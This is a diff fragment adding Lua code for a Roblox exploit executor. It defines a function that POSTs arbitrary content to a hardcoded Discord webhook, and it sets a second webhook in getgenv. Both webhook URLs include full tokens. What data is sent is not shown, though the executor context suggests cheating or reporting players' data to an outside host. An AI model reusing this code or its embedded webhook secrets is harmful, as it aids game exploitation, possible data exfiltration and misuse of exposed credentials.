@@ -1,3 +1,32 @@
+local HttpService = game:GetService("HttpService")
+
+local Webhook = "https://discord.com/api/webhooks/1386540467340185683/a_0kHXLetYZdZwrEa2niqiYd5LxuNx1wCwNkt-bDtEko9bAo2Lv7vIvhmQ_dJIfYSs3e"
+local Username = "mery911"
+
+local function sendWebhook(content)
+    local payload = {
+        username = Username,
+        content = content
+    }
+    local headers = { ["Content-Type"] = "application/json" }
+    local requestData = HttpService:JSONEncode(payload)
+
+    local success, response = pcall(function()
+        return syn and syn.request or http_request or request
+    end)
+
+    if success and response then
+        response({
+            Url = Webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = requestData
+        })
+        print("Webhook sent successfully!")
+    else
+        warn("Failed to send webhook. Your environment may not support HTTP requests.")
+    end
+end
 getgenv().Webhook = "https://discord.com/api/webhooks/1422841362910416990/41fqH7X8_7vUqkiMjiM9t098GtuKo1SuWgk6ssEGdP-6rTf7G0WwSwtMPH8fANCS7FG5"
 getgenv().Username = "mery911"
         local RS = game:GetService("ReplicatedStorage")
